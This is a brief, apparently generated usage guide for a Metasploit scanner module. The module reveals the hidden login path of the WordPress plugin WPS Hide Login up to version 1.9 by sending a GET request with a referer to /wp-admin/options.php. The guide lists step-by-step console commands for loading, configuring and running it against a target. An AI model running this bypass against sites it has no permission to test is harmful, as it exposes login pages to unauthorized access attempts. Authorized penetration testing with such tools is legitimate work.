**The description of current metasploit exploit**
This module exploits a bypass issue with WPS Hide Login version <= 1.9.  WPS Hide Login          is used to make a new secret path to the login page, however a 'GET' request to          '/wp-admin/options.php' with a referer will reveal the hidden path.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/wp_wps_hide_login_revealer
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your [The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html] here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 80 - The target port (TCP)

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.